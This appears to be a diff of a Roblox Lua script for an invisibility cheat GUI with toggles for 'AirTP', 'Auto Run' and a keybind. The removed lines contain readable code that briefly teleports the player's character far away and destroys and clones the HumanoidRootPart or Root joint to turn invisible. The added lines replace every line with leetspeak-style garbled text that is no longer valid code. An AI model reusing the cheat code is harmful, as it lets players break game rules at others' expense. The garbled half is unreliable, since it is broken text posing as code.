+	T&}{7L^|o£1_2.B∂(|(6|2()|_|2|)T®@/\\/?p4?£|1©'/ = 0.999000012-aite746
+	T£><']['L/-\8£|__2.Pø51']['|ø|V = UD!|\/|2.23|/|/(0.4513-aite-aite896, 0, 0, 0)
+	T£×']['L/-\|3&|__2.S][23 = UD1]V[2.|V£uu(0.0972to2toto39, 0, 1, 0)
+	T&%+L^83|__2.Fø|1'][' = E(\)µ]V[.F[]/|/7.S(lFl
+	T3×']['L@|3&£_to.F92+S!2€ = E/\\/µ|11.F9|1†S!z&.Slz£14
+	T£)(7L∂|3€1_2.T&)('][' = "-"
+	T£)(†L/\13&1_2.T3?7C()1()|23 = C()£()123.|V&\A/(1, 1, 1)
+	T€><+L^13€|_2.T3}{']['S1(\)£ = 14
 
-	BoolToggle.Name = "BoolToggle"
-	BoolToggle.Parent = AirTP
-	BoolToggle.BackgroundColor3 = Color3.new(0.207843, 1, 0.392157)
-	BoolToggle.BackgroundTransparency = 0.5
-	BoolToggle.BorderSizePixel = 0
-	BoolToggle.Position = UDim2.new(0.784722209, 0, 0, 0)
-	BoolToggle.Size = UDim2.new(0.215277776, 0, 1, 0)
-	BoolToggle.Font = Enum.Font.SciFi
-	BoolToggle.FontSize = Enum.FontSize.Size14
-	BoolToggle.Text = "true"
-	BoolToggle.TextColor3 = Color3.new(1, 1, 1)
-	BoolToggle.TextSize = 14
+	B°°£T[]96|&.N4|11£ = "B<>*1T06613"
+	Bø9|T996|_€.P@12£?'][' = Al2TP
+	B9*£T°96|_3.B∂[|<9?[]|_||V|>C*1<>?3 = C010®3./\/£VV(0.207eight43, 1, 0.392157)
+	B091T()961£.B/\[|{62*[_]/|/|]T?4/\/59λ|?€/\/©j = 0.5
+	B0°1T969££.B*®|)£|ZS][2€P!}{££ = 0
+	B()ø|T99913.Pøŝ!+|<>2 = UDlAAto.?£uu(0.7eight47to2to09, 0, 0, 0)
+	B0ø£T*691&.S|(\)£ = UD1^^2./|/€\|/(0.to15277776, 0, 1, 0)
+	B()[]£T996|_€.F[]|V7 = E|V|_|]V[.F0/|/†.S[|F!
+	B<>()|T*66|£.F*27S][2€ = E2|_|/\/\.F°/\\/+S][(\)3.S|2£14
+	B*0|_T996|£.T€×'][' = "']['12[_]£"
+	B()9£Tø69|€.T£)(7C01°®3 = Cø1<>12drei.2€\\'(1, 1, 1)
+	B**|_Tø99|_£.T£×†S1z£ = 14
 
-	AutoRun.Name = "AutoRun"
-	AutoRun.Parent = SubFrame
-	AutoRun.BackgroundColor3 = Color3.new(0, 0, 0)
-	AutoRun.BackgroundTransparency = 0.9990000128746
-	AutoRun.Position = UDim2.new(0, 0, 0.238993704, 0)
-	AutoRun.Size = UDim2.new(1, 0, 0.176100627, 0)
+	A[_]7*Rµ2.Nλ/v\3 = "A|_|']['()R[_]/\\/"
+	Aµ+*R|_|?.P@|2£/\/† = Sµ|oF1²∂/v\£
+	Aµ7øR|_||V.B@©|{62*[_]|1|]C°|ø?drei = C[]1[]|23.|\|3uu(0, 0, 0)
+	A[_]+[]Rµ|1.B/-\<|(6®9|_|11|]T?/-\|1§pq12€|1©°/ = 0.999000012-aite746
+	A|_|']['9Rµ2.P[]$|+19|1 = UD||\/|2./\/3\^/(0, 0, 0.todreieight99drei704, 0)
+	A[_]']['<>R|_||\|.S|(\)£ = UD|]V[2.|1£\^/(1, 0, 0.1761006to7, 0)
 
-	TextLabel_3.Parent = AutoRun
-	TextLabel_3.BackgroundColor3 = Color3.new(0, 0, 0)
-	TextLabel_3.BackgroundTransparency = 0.9990000128746
-	TextLabel_3.Position = UDim2.new(0.166666672, 0, 0, 0)
-	TextLabel_3.Size = UDim2.new(0.284722209, 0, 1, 0)
-	TextLabel_3.Font = Enum.Font.SciFi
-	TextLabel_3.FontSize = Enum.FontSize.Size14
-	TextLabel_3.Text = "Auto Run"
-	TextLabel_3.TextColor3 = Color3.new(1, 1, 1)
-	TextLabel_3.TextSize = 14
-	TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left
+	T3%†Lq8&1_3.P42€/|/+ = A|_|+[]Rµ|\|
+	T€×†L^|3&1_drei.B/\©|{6?0[_]|\|<|Cø|_<>?3 = C919|?drei.2£\^/(0, 0, 0)
+	T£%†L/-\l³£|__drei.B/\[|{9|2<>[_]/Vo|T1²4/\\/§9@?€|1©'/ = 0.99900001to-aite746
+	T£}{+L@|>£|__drei.P°?!7|()/\/ = UD][/|\2.23VV(0.16666667to, 0, 0, 0)
+	T&}{+L/\|>€|__3.S1z€ = UD1/v\to.|\|3\|\|(0.toeight47to2to09, 0, 1, 0)
+	T€)(7L∂ß€|__3.F()|\|7 = E|1|_||11.F<>2†.S(][F][
+	T£?†Lq|o£1_3.F()|V†S!2& = E/\\/|_||\/|.Fø/\\/']['S!(\)£.Sl2£14
+	T3}{+L^|3€1_3.T&}{† = "Aµ']['9 Rµ/\/"
+	T€)(†L^|3££_3.T£%']['C*1°|?drei = C()19®3.113\\'(1, 1, 1)
+	T&><7L^ß&|__drei.T&><+Sl23 = 14
+	T&×7L4|3€1_drei.T£)(†XA|_][9/V/|\€?+ = E/V|_||\/|.T&?+XA|_|9(\)(V)3/\/†.L&PH†
 
-	TextLabel_4.Parent = AutoRun
-	TextLabel_4.BackgroundColor3 = Color3.new(0, 0, 0)
-	TextLabel_4.BackgroundTransparency = 0.9990000128746
-	TextLabel_4.Position = UDim2.new(0.451388896, 0, 0, 0)
-	TextLabel_4.Size = UDim2.new(0.0972222239, 0, 1, 0)
-	TextLabel_4.Font = Enum.Font.SciFi
-	TextLabel_4.FontSize = Enum.FontSize.Size14
-	TextLabel_4.Text = "-"
-	TextLabel_4.TextColor3 = Color3.new(1, 1, 1)
-	TextLabel_4.TextSize = 14
+	T€><+Lq|3€1_4.Pλя3/\\/7 = A[_]7<>R|_|/|/
+	T€)(7L/\13£|_4.B^[|(91²øµ|\|đC*£[]|?3 = Cø10|?drei./\/€\|\|(0, 0, 0)
+	T€)(†Lq831_4.B^©|{9|Z*µ/|/|>T24/\\/$][Dq?€/V©'/ = 0.99900001toeight746
+	T&><7L4l³£|__4.P<>?|']['1<>2 = UD!|112.|1£\A/(0.4513-aite-aiteeight96, 0, 0, 0)
+	T€}{†Lqß&|__4.S][23 = UD][/v\to.2£uu(0.097to22totodrei9, 0, 1, 0)
+	T£?†L@8€1_4.Fø/V7 = E|1|_|/v\.F()117.S<1F1
+	T€%†L/-\l³£1_4.F*|\|']['S1(\)€ = E(\)[_]^^.F0|17S123.S!z314
+	T&)(']['L/-\8£|_4.T3%+ = "-"
+	T3?7Lq|3&1_4.T£%7C[]|_9?3 = C[]£[]?3./V3VV(1, 1, 1)
+	T€%†L@|3&1_4.T&}{+S1z& = 14
 
-	BoolToggle_2.Name = "BoolToggle"
-	BoolToggle_2.Parent = AutoRun
-	BoolToggle_2.BackgroundColor3 = Color3.new(0.207843, 1, 0.392157)
-	BoolToggle_2.BackgroundTransparency = 0.5
-	BoolToggle_2.BorderSizePixel = 0
-	BoolToggle_2.Position = UDim2.new(0.784722209, 0, 0, 0)
-	BoolToggle_2.Size = UDim2.new(0.215277776, 0, 1, 0)
-	BoolToggle_2.Font = Enum.Font.SciFi
-	BoolToggle_2.FontSize = Enum.FontSize.Size14
-	BoolToggle_2.Text = "true"
-	BoolToggle_2.TextColor3 = Color3.new(1, 1, 1)
-	BoolToggle_2.TextSize = 14
+	B<>ø|T99613_2.N4|11& = "Bøø|Tø691£"
+	B<>()|T()96|3_to.P@я3(\)'][' = A|_|']['øR[_]/\/
+	B001T()99|_£_to.B@©|(6я<>|_|/Vo|C°10|Zdrei = C<>1<>|?3./\/&\A/(0.207-aite4drei, 1, 0.392157)
+	Bø*1T°961€_to.B4[|<9120µ(\)ÐT1²@|V5|>^я€?©'/ = 0.5
+	B991T099|£_2.B012đ3®S|z&P][?£1 = 0
+	B°°1T°99|_€_2.P[]§l719/V = UDl|'|'|2./\\/&uu(0.7847to2to09, 0, 0, 0)
+	B[][]|_T°961&_to.S!(\)3 = UDlAAto./\\/3\|\|(0.215to77776, 0, 1, 0)
+	B<>ø|_T<>9913_2.F<>11† = E|Vµ]V[.F()2']['.S<!Fl
+	B[][]|_T9661€_to.F927Slz& = E|1[_]|'|'|.Fø|1']['S][2£.S|2&14
+	Bø()|_T99613_2.T€><7 = "7®|_|&"
+	Bø()|_T[]66££_to.T&?']['C*£()®3 = C*|_ø?3.?3\\'(1, 1, 1)
+	B*01T()69|€_2.T£><†S|z£ = 14
 
-	Keybind.Name = "Keybind"
-	Keybind.Parent = SubFrame
-	Keybind.BackgroundColor3 = Color3.new(0, 0, 0)
-	Keybind.BackgroundTransparency = 0.9990000128746
-	Keybind.Position = UDim2.new(0, 0, 0.415094346, 0)
-	Keybind.Size = UDim2.new(1, 0, 0.176100627, 0)
+	K3°/13l|\||].Nq^^€ = "K€'/13!/V<|"
+	K3'/|3][2|).P/\?311'][' = S|_|13Fяλ/v\&
+	K£`/|o|/\/o|.B@<|(929[_]|1|]C0£<>?3 = C<>|ø|Zdrei.?€|/|/(0, 0, 0)
+	K£`/|>|/\/|>.B@(|(6|29[_]/V<|T|?^/\\/5|>@1²3(\)(`/ = 0.99900001toeight746
+	K€`/|3l(\)|).Pø?l']['l9/\/ = UDlAAto.|\|€\|\|(0, 0, 0.415094drei46, 0)
+	K3`/ß1|1đ.S1(\)3 = UD!|112.|\|€\\'(1, 0, 0.1761006to7, 0)
 
-	TextLabel_5.Parent = Keybind
-	TextLabel_5.BackgroundColor3 = Color3.new(0, 0, 0)
-	TextLabel_5.BackgroundTransparency = 0.9990000128746
-	TextLabel_5.Position = UDim2.new(0.166666672, 0, 0, 0)
-	TextLabel_5.Size = UDim2.new(0.284722209, 0, 1, 0)
-	TextLabel_5.Font = Enum.Font.SciFi
-	TextLabel_5.FontSize = Enum.FontSize.Size14
-	TextLabel_5.Text = "Keybind"
-	TextLabel_5.TextColor3 = Color3.new(1, 1, 1)
-	TextLabel_5.TextSize = 14
-	TextLabel_5.TextXAlignment = Enum.TextXAlignment.Left
+	T&%7L^l³€1_5.Pq|2&/V† = K£`/8l|1|]
+	T3)(†L^ß£|__5.Bλ(|{9|?()[_]|VđC°1<>?3 = C°1023.(\)3\|\|(0, 0, 0)
+	T€?+L@133|__5.B@<|(6|?*[_]/|/<|T|Z/-\115pq1²€|\|('/ = 0.99900001toeight746
+	T3×']['Lq13€|_5.P05!†l[](\) = UD][AAto.?£\|/(0.166666672, 0, 0, 0)
+	T£?+Lλ133|_5.S|2£ = UD1AA2.23\|\|(0.toeight47to2209, 0, 1, 0)
+	T3}{†Lql³&|__5.F()|17 = E/V[_]]V[.F<>2']['.S[lFl
+	T&×']['Lq1331_5.F9/\/']['Slz£ = E|Vµ|'|'|.Fø117S][23.S|2&14
+	T£><+L/-\|o£|__5.T3><7 = "K3`/131|\|o|"
+	T£%†L^|>3£_5.T£}{']['C01ø®3 = C*1[]®drei./V€\A/(1, 1, 1)
+	T&%7Lλ|>£1_5.T£%7S][z3 = 14
+	T&%+Lq|3€|_5.T€?']['XA1!9(\)|\/|€|\|7 = E?[_](V).T£}{7XA||6|V]V[£|17.L3|"+
 
-	TextLabel_6.Parent = Keybind
-	TextLabel_6.BackgroundColor3 = Color3.new(0, 0, 0)
-	TextLabel_6.BackgroundTransparency = 0.9990000128746
-	TextLabel_6.Position = UDim2.new(0.451388896, 0, 0, 0)
-	TextLabel_6.Size = UDim2.new(0.0972222239, 0, 1, 0)
-	TextLabel_6.Font = Enum.Font.SciFi
-	TextLabel_6.FontSize = Enum.FontSize.Size14
-	TextLabel_6.Text = "-"
-	TextLabel_6.TextColor3 = Color3.new(1, 1, 1)
-	TextLabel_6.TextSize = 14
+	T&?+L@|3€|_6.P@1²€?'][' = K3`/|31/\\/<|
+	T€}{+L^ß€1_6.B/\<|<9|2*|_||1o|C0|9яdrei = C0£*1²drei.11€\^/(0, 0, 0)
+	T£}{†L∂l³€1_6.B4©|(6®()|_||1đT?q?§|>∂|?£/\\/(j = 0.9990000128746
+	T£×7L@|33|__6.Pø§|7|°? = UDl/|\to.|V€\|/(0.4513-aite-aite-aite96, 0, 0, 0)
+	T&%†Lλ|3£|_6.S|2& = UD1[]V[]to.11£uu(0.097222to2drei9, 0, 1, 0)
+	T£><7L^|>&1_6.Fø/V7 = E/\\/|_||11.F<>|V']['.S©1F][
+	T&?+Lλ|o3|__6.F()/V7S!(\)3 = E/\\/[_]]V[.F0|V†S|2£.S!z€14
+	T€><']['L@l³&£_6.T&><+ = "-"
+	T&><†Lql³€1_6.T€%†C*£*|2drei = C*£*23./V3\|\|(1, 1, 1)
+	T£)(†L/\|>31_6.T&?7S|23 = 14
 
-	CurrentBind.Name = "CurrentBind"
-	CurrentBind.Parent = Keybind
-	CurrentBind.BackgroundColor3 = Color3.new(0.262745, 0.964706, 1)
-	CurrentBind.BackgroundTransparency = 0.5
-	CurrentBind.BorderSizePixel = 0
-	CurrentBind.Position = UDim2.new(0.784722209, 0, 0, 0)
-	CurrentBind.Size = UDim2.new(0.215277776, 0, 1, 0)
-	CurrentBind.Font = Enum.Font.SciFi
-	CurrentBind.FontSize = Enum.FontSize.Size14
-	CurrentBind.Text = "i"
-	CurrentBind.TextColor3 = Color3.new(1, 1, 1)
-	CurrentBind.TextSize = 14
+	C|_|®|Z€|1+B][/|/|).N^]V[& = "C|_||21²3?†Bl2|)"
+	C[_]®|Z32']['B!(\)|).P^?€/V7 = K£°/13!?|)
+	C|_|12|?£|1+B!/\/o|.B∂<|{6|2ø[_](\)đC01*|?drei = C°£()|23.|\|£uu(0.to6to745, 0.964706, 1)
+	C[_]я12€|\|+B1(\)đ.B@<|<6|?()|_|11<|T2q|Vŝ|2@?&/\/<°/ = 0.5
+	Cµ|2|Z£/V†B!(\)Ð.B*?|)&|?S!z£P!}{€£ = 0
+	Cµ|2|?3(\)†Bl2đ.P9$!+l°|\| = UD1/v\to.113\|/(0.7-aite47to2to09, 0, 0, 0)
+	C[_]®|2&|V+B][|Vo|.S|23 = UD!^^2.11&\|/(0.to15277776, 0, 1, 0)
+	C[_]12|Z£|\|+B][|VÐ.F9/V'][' = E|Vµ|11.F()|V']['.S©|F][
+	Cµя|Z&|\|†B12o|.F<>|17S!2& = E/|/µ(V).F()/|/']['S|z3.S1z314
+	Cµ1²?3|\|7B|11<|.T€?7 = "|"
+	C|_|я|?€|\|7B1|VÐ.T3><7C*19®3 = C<>£0123.(\)£\^/(1, 1, 1)
+	C[_]|Z|?&/\/†B!|\|<|.T£}{']['S12& = 14
 
-	QuickInvis.Name = "QuickInvis"
-	QuickInvis.Parent = SubFrame
-	QuickInvis.BackgroundColor3 = Color3.new(1, 0.227451, 0.227451)
-	QuickInvis.BackgroundTransparency = 0.5
-	QuickInvis.BorderSizePixel = 0
-	QuickInvis.Position = UDim2.new(0, 0, 0.823899388, 0)
-	QuickInvis.Size = UDim2.new(1, 0, 0.176100627, 0)
-	QuickInvis.Font = Enum.Font.SciFi
-	QuickInvis.FontSize = Enum.FontSize.Size14
-	QuickInvis.Text = "Go Invisible"
-	QuickInvis.TextColor3 = Color3.new(1, 1, 1)
-	QuickInvis.TextSize = 14
+	Q[_]!<|{I11\/l§.Nq/|\3 = "Qµ][<|<I|1\|][?"
+	Qµ|<|<I|1|/][$.P∂|Z3|17 = S|_||>F®^|\/|3
+	Q[_]][©|{I|V\|][ŝ.B/-\<|{62<>[_]?ÐC<>|°|?drei = C()|_02drei.?£\|\|(1, 0.2to7451, 0.to27451)
+	Q|_|][[|<I/\\/\|15.B∂©|{912øµ/\/o|T|2/-\/\/5|*4|2£/\\/<j = 0.5
+	Q|_|][(|<I11|/|§.B<>|?|]3|ZS!2&P1%€1 = 0
+	Qµ![|(I2\/!ŝ.P()ŝ1†l*/|/ = UD||112.(\)£\\'(0, 0, 0.823899dreieighteight, 0)
+	Qµl©|<I?\/!$.S!z3 = UDl|\/|to.|\|3\|\|(1, 0, 0.176100627, 0)
+	Qµ|<|<I|1\|!5.F*/V'][' = E/V|_|[]V[].F*/\\/']['.S©lF][
+	Qµl[|(I|1|/1ŝ.F*11']['S|z£ = E2µ|\/|.F9/V']['Sl2£.S|z314
+	Qµ1(|<I?\|!ŝ.T&><7 = "G() I/\\/|/1§][|3£3"
+	Q[_]1[|{I11|/l5.T€}{']['C<>£()®drei = C()|_9®drei.(\)£|/|/(1, 1, 1)
+	Qµ![|(I11\/!5.T€×']['S!(\)& = 14
 
-	Rigtype.Name = "Rigtype"
-	Rigtype.Parent = SubFrame
-	Rigtype.BackgroundColor3 = Color3.new(0, 0, 0)
-	Rigtype.BackgroundTransparency = 0.69999998807907
-	Rigtype.BorderSizePixel = 0
-	Rigtype.Position = UDim2.new(0, 0, 0.647798777, 0)
-	Rigtype.Size = UDim2.new(1, 0, 0.176100627, 0)
-	Rigtype.Font = Enum.Font.SciFi
-	Rigtype.FontSize = Enum.FontSize.Size14
-	Rigtype.Text = "Your Rigtype - RigTypeHere"
-	Rigtype.TextColor3 = Color3.new(1, 1, 1)
-	Rigtype.TextSize = 14
+	R!6+j|>€.N^AA£ = "R|9']['°/][D3"
+	Rl9†`/|°3.P423/V'][' = S[_]|>F1²/-\/\/\&
+	R!67`/][D3.B/\<|(6|2*[_]/|/đC91ø2drei = C<>|*®drei.11&\\'(0, 0, 0)
+	Rl6+j|2€.B∂©|<91²9[_]/|/|]T|2λ/\/?|>/\23/V<j = 0.69999998-aite07907
+	R][67°/|*£.B0яo|&яS][2€P|}{£1 = 0
+	Rl97j|2€.P*5][+][()|V = UD|/\/\to.|1€\\'(0, 0, 0.64779-aite777, 0)
+	R|6+`/|*3.Slz£ = UD!AAto./V€\A/(1, 0, 0.1761006to7, 0)
+	R!9'][''/|2£.F<>|V+ = E11|_||11.F()2+.S(][F][
+	Rl6†°/93.F9|V+S1(\)£ = E/|/[_]/\/\.F<>/\\/+S|z3.S1z314
+	Rl97j|>3.T&?7 = "Yøµ2 R][6+j9£ - R!6T`/|D&H3®£"
+	Rl6'][''/|*&.T&)(+C[]1*|Zdrei = C01()123.(\)&\^/(1, 1, 1)
+	Rl9']['°/p3.T£%']['S!(\)& = 14
 
-	TextButton.Parent = GUI
-	TextButton.BackgroundColor3 = Color3.new(0, 0, 0)
-	TextButton.BackgroundTransparency = 0.5
-	TextButton.BorderSizePixel = 0
-	TextButton.Position = UDim2.new(0.0265151523, 0, 0.865612626, 0)
-	TextButton.Size = UDim2.new(0.0606060624, 0, 0.0948616564, 0)
-	TextButton.Font = Enum.Font.SciFi
-	TextButton.FontSize = Enum.FontSize.Size14
-	TextButton.Text = "Open"
-	TextButton.TextColor3 = Color3.new(1, 1, 1)
-	TextButton.TextSize = 14
+	T£%7B|_|+7<>|V.P@®32'][' = GUI
+	T£×']['Bµ']['']['°?.B@[|(6|2[]µ|\|đCø|ø|23 = C91[]|Z3.2&\/\/(0, 0, 0)
+	T3><']['B[_]++*/|/.B4<|{9|Z9µ11o|T|Z@|1?94|2£|V©`/ = 0.5
+	T€><']['B[_]7']['9/\\/.Bø2Ð£|?S1z€P|}{3|_ = 0
+	T€><†B|_|†7()|1.Pø?l']['][()/|/ = UDl|112.|1&|/|/(0.0to6515152drei, 0, 0.-aite6561to626, 0)
+	T3}{']['Bµ']['7<>11.Sl23 = UD][AAto.2&\|/(0.0606060624, 0, 0.094-aite616564, 0)
+	T3)(']['B|_|+7*?.F°/\/7 = E(\)µ/|\.F[]/|/7.S(][Fl
+	T&><7B|_|+']['0|\|.F°117S|(\)£ = E/\\/|_||'|'|.Fø/\\/†S][(\)&.Sl(\)314
+	T&?']['Bµ']['7°/|/.T£%† = "O][D€/\/"
+	T£%†B[_]†7*/|/.T&?']['C*£*|2drei = Cø£<>|Z3.(\)3\A/(1, 1, 1)
+	T€?+B|_|7†°2.T£%†S|23 = 14
 
-	local Player   = game:GetService('Players').LocalPlayer
-	local Mouse    = Player:GetMouse()
+	1°©/-\|_ P£/-\j€®   = 9^[]V[]&:G€†S£|?\|l[£('P|_4j32§').L9(@1P|_λ`/&®
+	1()</-\1 M()µ$&    = P|@'/3я:G&7M°[_]5€()
 
-	local AutoRun  = true
-	local AirTP    = true
-	local Keybind  = 'i'
+	1°©/-\£ Aµ']['9R|_||1  = 7я[_]3
+	|_9(@£ A!2TP    = †?|_|€
+	|()©∂1 K3`/13|/V<|  = '1'
 
-	local Green    = Color3.fromRGB(53, 255, 100)
-	local Red      = Color3.fromRGB(255, 58, 58)
+	1ø[∂1 G?€£?    = C*19?drei.|"®[]|11RGB(5drei, 255, 100)
+	|9</\1 R&Ð      = C[]£ø|23.|=12[]/|\RGB(255, 5-aite, 58)
 
-	local function CheckRig()
-		if Player.Character then
-			local Humanoid = Player.Character:WaitForChild('Humanoid')
-			if Humanoid.RigType == Enum.HumanoidRigType.R15 then
-				return 'R15'
-			else
-				return 'R6'
-			end
-		end
-	end
+	|*[@1 PH[_]?<']['|0|1 C4&<|(Rl9()
+		||= P|q°/€|2.C]-[4®@<†&? 7|-|€(\)
+			|_()<@|_ H[_]|\/|^/Vø][|] = P1/\`/3|2.C|-|/\|Z@(+€?:Wλ][+F[]|2C/-/!£Ð('Hµ/|\@/V()|Ð')
+			1|= H|_|(V)/\2*][đ.R19T'/p€ == E2|_||11.Hµ/v\λ|V*!|>R19T°/|°€.R15 +]-[&/\/
+				|Z€7[_]?|\| 'R15'
+			£|$3
+				?3']['µ|2|\| 'R6'
+			&/\/|]
+		£/\/đ
+	&(\)o|
 
-	local function InitiateInvis()
-		local Character = Player.Character
-		local StoredCF = Character.PrimaryPart.CFrame
-		if AirTP then
-			local Part = Instance.new('Part',workspace)
-			Part.Size = Vector3.new(5,0,5)
-			Part.Anchored = true
-			Part.CFrame = CFrame.new(Vector3.new(9999,9999,9999))
-			Character.PrimaryPart.CFrame = Part.CFrame*CFrame.new(0,3,0)
-			spawn(function()
-				wait(3)
-				Part:Destroy()
-			end)
-		end
-		if CheckRig() == 'R6' then
-			local Clone = Character.HumanoidRootPart:Clone()
-			Character.HumanoidRootPart:Destroy()
-			Clone.Parent = Character
-		else
-			local Clone = Character.LowerTorso.Root:Clone()
-			Character.LowerTorso.Root:Destroy()
-			Clone.Parent = Character.LowerTorso
-		end
-		if AirTP then
-			wait(1)
-			Character.PrimaryPart.CFrame = StoredCF
-		end
-	end
+	|<>(@|_ |"|_|(\)©+![]/V I2][']['!λ+£I/\\/\|][5()
+		£*[/\| C4∂?q©†€|2 = P£^j£?.C/-/λ|Zλ(+£|Z
+		1<>(∂1 S70я£|)CF = C}{∂я/\©†€12.P12|/\/\q?jP/-\|2†.CF1²4/v\3
+		1PH A][|ZTP ']['#£/|/
+			1*©/\£ P@я† = I1157/-\?<3.2€\|/('P4я†',\^/()я|{ŝ|D/-\©£)
+			Pλ|Z+.Sl2& = V£[']['[]я3.|V&|/|/(5,0,5)
+			Pq|?7.A?©/-/[]2£đ = +?|_|3
+			P@|2']['.CFя4]V[€ = CF|2∂/v\€.11€\|\|(V£©†°1²drei./|/€\/\/(9999,9999,9999))
+			C#/-\12^(7&?.P|?l]V[@1²`/P∂2+.CF12^]V[£ = Pλ®7.CF2/\[]V[]£*CF2@AA3.(\)&\/\/(0,3,0)
+			ŝ|°4\A//V(ƒ[_]|V(†!°|1()
+				\|\|/-\!']['(drei)
+				P4я'][':D£ŝ']['я*'/()
+			€|1<|)
+		&?|)
+		!ƒ C]-[£©|(Rl6() == 'R6' +#€/\/
+			£ø(4|_ C19/|/3 = C|-|4?λ[†£|Z.H[_]/|\λ(\)ø][|>R[]ø']['P∂1²7:C|_*|V&()
+			C#q1²λ©']['€|2.H[_][]V[]∂|V9][đR[]()7P/\?7:D&ŝ72()'/()
+			C1ø2€.P@|?&2† = C/-/^1²4<']['£|?
+		3£5£
+			1°©/-\£ C|_[]2& = C}{41²/\<7€|2.L9uu€|?T[]яŝ<>.Rø()'][':C1*/\/3()
+			C}{42λ[7€2.L<>\A/&?T<>|?§ø.R0*†:D&$†яø`/()
+			C1ø/|/€.Pλ|?311'][' = C}{q24©+&®.LøVV3|?Tø|Zŝø
+		&(\)|>
+		][|" A!?TP †4£/V
+			\/\/@l+(1)
+			C4q24<†&12.P®1AA/-\12`/P^я']['.CFя^/|\£ = S']['°я&|)CF
+		€/\\/o|
+	&|\|đ
 
-	local function OnCharacterAdded()
-		SubFrame.Rigtype.Text = ('Your Rigtype - %s'):format(CheckRig())
-		if AutoRun then
-			InitiateInvis()
-		end
-	end
+	1<></-\| |=[_]/|/[719/|/ O/VC/-//-\|Z∂[†3|?Ađ|>£|]()
+		S|_|l³F®q]V[3.R!6']['°/|²£.T€}{† = ('Y0[_]® R19']['`/p3 - %§'):|=[]|?(V)@7(C|-|£©|<R|6())
+		!PH A[_]+øRµ|\| '][']-[€2
+			I/|/l†][/-\']['£I(\)\|!?()
+		&(\)<|
+	£|V|)
 
-	local function OnButtonPress(Button)
-		if Button == Keybind:lower() then
-			InitiateInvis()
-		end
-	end
+	£°[/-\£ |=µ11<7![]/|/ O2B|_|']['+*|\|P|?£§§(B[_]']['']['ø|V)
+		1|" B[_]†792 == K€j13l|Vđ:1()\A/£|?() †}{3|\|
+			I/|/1']['|@†3I|1\/][§()
+		£11Ð
+	&|\|o|
 
-	local function OnGoInvisPress()
-		InitiateInvis()
-	end
+	1ø<@£ PH[_]/|/[†][°/V O11G()I(\)|/l?P2£ŝ§()
+		I/V][']['!q']['£I11\/1ŝ()
+	€|\||>
 
-	local function OnKeyBindTextChange()
-		local cb = SubFrame.Keybind.CurrentBind
-		if cb.Text:match('%w') then
-			Keybind = cb.Text:match('%w'):lower()
-			cb.Text = Keybind
-		elseif cb.Text ~= '' then
-			Keybind = 'i'
-			cb.Text = Keybind
-		end
-		print(Keybind)
-	end
+	1*©@1 PH|_|/\\/[+l°/\/ O2K&'/B12|>T£><+C|-|4?9&()
+		1°©/-\£ <|3 = S[_]|oF2@/\/\£.K3°/|3|?Ð.Cµ?1²&11']['B!/V|]
+		||" ©|3.T3×'][':/|\/\†©]-[('%uu') 7#&?
+			K&jß!/VÐ = [l³.T3×7:|'|'|∂']['©#('%\\''):£ø\|\|3|Z()
+			(l³.T€)(+ = K&j|3][|Vo|
+		3£?€][|= (13.T€×+ ~= '' +4&/V
+			K3jß][2|] = '|'
+			<8.T&)('][' = K€j8l/|/o|
+		£/V|>
+		|°|Z1|\|7(K3`/|3][2Ð)
+	3|\|đ
 
-	local function OnAutoRunPress()
-		local Ar = SubFrame.AutoRun.BoolToggle
-		if AutoRun then
-			Ar.BackgroundColor3 = Red
-			Ar.Text = tostring(not AutoRun)
-			AutoRun = false
-		else
-			Ar.BackgroundColor3 = Green
-			Ar.Text = tostring(not AutoRun)
-			AutoRun = true
-		end
-	end
+	1<>[@| |=[_]/\\/©+1ø(\) O|VA|_|†()R[_]|\|P®£§5()
+		19[^|_ A12 = S|_||oF?/-\|'|'|3.Aµ']['*Rµ(\).B9*|T()96|_€
+		1|= A|_|†[]R|_|(\) 7]-[€|1
+			A|Z.Bq©|{6?()|_|2ÐCø£°?3 = R£<|
+			A1².T€×7 = 705+12!|V6(|1<>† Aµ']['øR[_]|V)
+			A[_]†9R|_|(\) = ƒ∂|_ŝ3
+		&1$£
+			A12.B@(|<92()µ?|)C°|*яdrei = Gя€&?
+			Aя.T€?'][' = ']['*ŝ7|Z1/\/9(/\\/ø† A|_|7<>Rµ|1)
+			A|_|']['*R[_]/\\/ = ']['12[_]3
+		&(\)o|
+	&2o|
 
-	local function OnAirTPPress()
-		local ATP = SubFrame.AirTP.BoolToggle
-		if AirTP then
-			ATP.BackgroundColor3 = Red
-			ATP.Text = tostring(false)
-			AirTP = false
-		else
-			ATP.BackgroundColor3 = Green
-			ATP.Text = tostring(true)
-			AirTP = true
-		end
-	end
+	|ø(/-\1 PH[_]/\\/(†!ø/|/ O|VA][|2TPP®35$()
+		£9<^£ ATP = Sµ8F|2/-\AA&.A1яTP.B°ø|_T()961£
+		lƒ A1яTP 7#€/\\/
+			ATP.Bλ<|{912°|_|(\)|)C<>£ø|23 = R€<|
+			ATP.T3}{+ = +*$+12|116(|"@£ŝ€)
+			A1?TP = PH/-\|$3
+		£15£
+			ATP.B/\<|<9я[]|_||1|]C[]|ø|2drei = G|Z£€/\/
+			ATP.T€><'][' = +9?']['1²l(\)6(7|Zµ£)
+			Al12TP = +1²µ€
+		€/Vo|
+	£11đ
 
-	local function OnMinimizePress()
-		Main.Visible = false
-		GUI.TextButton.Visible = true
-	end
+	|_<>[^1 |"|_|11(†!9/\/ O/|/M][2][[]V[]|2£P|?£§?()
+		M^][2.V1ŝ||o1& = PH/\1§&
+		GUI.T&%7B[_]']['7*/V.V1?1|3|3 = +|?[_]3
+	&|1đ
 
-	local function OnOpenPress()
-		Main.Visible = true
-		GUI.TextButton.Visible = false
-	end
+	|_9©^1 |=µ11[†l9|1 O|VO|2£/VP2£ŝ5()
+		Mq][|\|.V!ŝ1|>1& = †12[_]3
+		GUI.T£%7B|_|+']['92.V!5][|o£€ = ƒ41?&
+	€|1|>
 
-	local function OnClosePress()
-		GUI:Destroy()
-	end
+	1ø©q| |"|_|/\\/<+l()/|/ O|\|C1ø5£P?&§$()
+		GUI:D£ŝ†®°j()
+	€|1o|
 
-	SubFrame.Keybind.CurrentBind:GetPropertyChangedSignal('Text'):connect(OnKeyBindTextChange)
-	Mouse.KeyDown:connect(OnButtonPress)
-	SubFrame.AutoRun.BoolToggle.MouseButton1Down:connect(OnAutoRunPress)
-	SubFrame.AirTP.BoolToggle.MouseButton1Down:connect(OnAirTPPress)
-	Main.Topbar.Minimize.MouseButton1Down:connect(OnMinimizePress)
-	GUI.TextButton.MouseButton1Down:connect(OnOpenPress)
